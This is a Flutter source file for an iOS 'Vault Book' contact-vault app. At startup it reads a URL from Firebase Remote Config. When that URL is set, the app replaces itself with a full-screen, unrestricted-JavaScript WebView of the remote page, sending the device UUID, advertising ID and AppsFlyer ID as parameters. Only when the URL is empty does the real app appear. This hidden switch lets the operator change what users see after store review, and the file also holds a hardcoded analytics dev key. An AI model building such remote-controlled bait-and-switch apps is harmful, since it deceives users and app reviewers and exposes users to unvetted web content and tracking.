import 'package:flutter/material.dart';
import 'screens/welcome_screen.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:uuid/uuid.dart';

class WebViewScreen extends StatelessWidget {
  final String url;

  const WebViewScreen({super.key, required this.url});

  @override
  Widget build(BuildContext context) {
    final controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageStarted: (String url) {
            print('Page started loading: $url');
          },
          onPageFinished: (String url) {
            print('Page finished loading: $url');
          },
          onWebResourceError: (WebResourceError error) {
            print('WebView error: ${error.description}');
            Navigator.of(context).pushReplacement(
              MaterialPageRoute(builder: (context) => const WelcomeScreen()),
            );
          },
          onNavigationRequest: (NavigationRequest request) {
            print('Navigation request to: ${request.url}');
            
            if (request.url.startsWith('error://')) {
              print('Error scheme detected, redirecting to welcome screen');
              Navigator.of(context).pushReplacement(
                MaterialPageRoute(builder: (context) => const WelcomeScreen()),
              );
              return NavigationDecision.prevent;
            }
            
            return NavigationDecision.navigate;
          },
        ),
      )
      ..loadRequest(Uri.parse(url));

    return Scaffold(
      body: Stack(
        children: [
          WebViewWidget(controller: controller),
          SafeArea(
            child: Align(
              alignment: Alignment.topRight,
              child: Container(
                margin: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: Colors.black.withOpacity(0.5),
                  shape: BoxShape.circle,
                ),
                child: IconButton(
                  icon: const Icon(Icons.close, color: Colors.white),
                  onPressed: () => Navigator.of(context).pushReplacement(
                    MaterialPageRoute(builder: (context) => const WelcomeScreen()),
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

Future<String> getOrCreateUUID() async {
  final prefs = await SharedPreferences.getInstance();
  String? uuid = prefs.getString('device_uuid');
  
  if (uuid == null) {
    uuid = const Uuid().v4();
    await prefs.setString('device_uuid', uuid);
  }
  
  return uuid;
}

Future<String?> getAppsFlyerId() async {
  try {
    final AppsFlyerOptions options = AppsFlyerOptions(
      afDevKey: 'TVuiYiPd4Bu5wzUuZwTymX',
      appId: "6741470168",
      showDebug: true,
    );
    final appsflyerSdk = AppsflyerSdk(options);
    
    final result = await appsflyerSdk.getAppsFlyerUID();
    return result;
  } catch (e) {
    print('Error getting AppsFlyer ID: $e');
    return null;
  }
}

Future<Map<String, String>> getDeviceInfo() async {
  final deviceInfo = <String, String>{};
  
  // Get or create persistent UUID
  final uuid = await getOrCreateUUID();
  deviceInfo['uuid'] = uuid;
  
  // Get IDFA (Advertising Identifier)
  try {
    final status = await AppTrackingTransparency.trackingAuthorizationStatus;
    if (status == TrackingStatus.authorized) {
      final idfa = await AppTrackingTransparency.getAdvertisingIdentifier();
      deviceInfo['idfa'] = idfa;
    } else {
      deviceInfo['idfa'] = '';
    }
  } catch (e) {
    print('Error getting IDFA: $e');
    deviceInfo['idfa'] = '';
  }

  deviceInfo['bundle_id'] = 'com.appadsrocket.contactvault';

  // Get AppsFlyer ID
  final appsFlyerId = await getAppsFlyerId();
  deviceInfo['appsflyer_id'] = appsFlyerId ?? '';

  return deviceInfo;
}

void main() async {
  try {
    WidgetsFlutterBinding.ensureInitialized();

    // Initialize Firebase
    try {
      await Firebase.initializeApp();
    } catch (e) {
      print('Failed to initialize Firebase: $e');
    }

    // Request tracking authorization first
    try {
      await Future.delayed(const Duration(seconds: 1));
      final status = await AppTrackingTransparency.requestTrackingAuthorization();
      print('Tracking authorization status: $status');
    } catch (e) {
      print('Failed to request tracking authorization: $e');
    }

    // Initialize remote config
    final remoteConfig = FirebaseRemoteConfig.instance;
    await remoteConfig.setConfigSettings(RemoteConfigSettings(
      fetchTimeout: const Duration(minutes: 1),
      minimumFetchInterval: const Duration(seconds: 30),
    ));
    await remoteConfig.fetchAndActivate();

    // Get URL from remote config
    final url = remoteConfig.getString('url');
    print('Remote config URL: $url');
    
    if (url.isNotEmpty) {
      // Get device information
      final deviceInfo = await getDeviceInfo();
      
      // Replace placeholders in URL
      var finalUrl = url
        .replaceAll('{bundle_id}', deviceInfo['bundle_id']!)
        .replaceAll('{uuid}', deviceInfo['uuid']!)
        .replaceAll('{idfa}', deviceInfo['idfa']!)
        .replaceAll('{appsflyer_id}', deviceInfo['appsflyer_id']!);
        
      print('Final URL with parameters: $finalUrl');
      
      // Launch WebView with the URL
      runApp(MaterialApp(
        home: WebViewScreen(url: finalUrl),
        debugShowCheckedModeBanner: false,
        theme: ThemeData(
          primarySwatch: Colors.blueGrey,
          primaryColor: Colors.blueGrey,
          useMaterial3: false,
          appBarTheme: const AppBarTheme(
            foregroundColor: Colors.black,
            backgroundColor: Colors.transparent,
            elevation: 0,
          ),
          floatingActionButtonTheme: const FloatingActionButtonThemeData(
            backgroundColor: Colors.blueGrey,
            foregroundColor: Colors.white,
          ),
        ),
      ));
      return;
    }

    // Run normal app if WebView conditions not met
    runApp(const MyApp());
  } catch (e) {
    print('Fatal error during initialization: $e');
    runApp(const MyApp());
  }
}

Future<String> fetchDevKeyFromRemoteConfig() async {
  final FirebaseRemoteConfig remoteConfig = FirebaseRemoteConfig.instance;
  try {
    await remoteConfig.setDefaults(<String, dynamic>{
      'dev_key': 'TVuiYiPd4Bu5wzUuZwTymX', // Default value if Remote Config fails
    });
    await remoteConfig.fetchAndActivate();
    String devKey = remoteConfig.getString('dev_key');
    print('Fetched dev_key: $devKey');
    return devKey;
  } catch (e) {
    print('Error fetching dev_key from Remote Config: $e');
    return 'TVuiYiPd4Bu5wzUuZwTymX'; // Fallback dev key
  }
}

void initAppsFlyer(String devKey, bool isTrackingAllowed) {
  // Set timeToWaitForATTUserAuthorization based on tracking permission
  final double timeToWait = isTrackingAllowed ? 10 : 0;

  final AppsFlyerOptions options = AppsFlyerOptions(
      afDevKey: devKey,
      appId: "6741470168",
      showDebug: true,
      timeToWaitForATTUserAuthorization: timeToWait,
      manualStart: false);

  final appsflyerSdk = AppsflyerSdk(options);

  if (isTrackingAllowed) {
    appsflyerSdk.initSdk(
        registerConversionDataCallback: true,
        registerOnAppOpenAttributionCallback: true,
        registerOnDeepLinkingCallback: true);
    appsflyerSdk.startSDK(
      onSuccess: () => print("AppsFlyer SDK initialized successfully."),
      onError: (int errorCode, String errorMessage) => print(
          "Error initializing AppsFlyer SDK: Code $errorCode - $errorMessage"),
    );
  } else {
    print("Tracking denied, skipping AppsFlyer initialization.");
  }
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Vault Book',
      theme: ThemeData(
        primarySwatch: Colors.blueGrey,
        primaryColor: Colors.blueGrey,
        useMaterial3: false,
        appBarTheme: const AppBarTheme(
          foregroundColor: Colors.black,
          backgroundColor: Colors.transparent,
          elevation: 0,
        ),
        floatingActionButtonTheme: const FloatingActionButtonThemeData(
          backgroundColor: Colors.blueGrey,
          foregroundColor: Colors.white,
        ),
      ),
      debugShowCheckedModeBanner: false,
      home: const WelcomeScreen(),
    );
  }
}
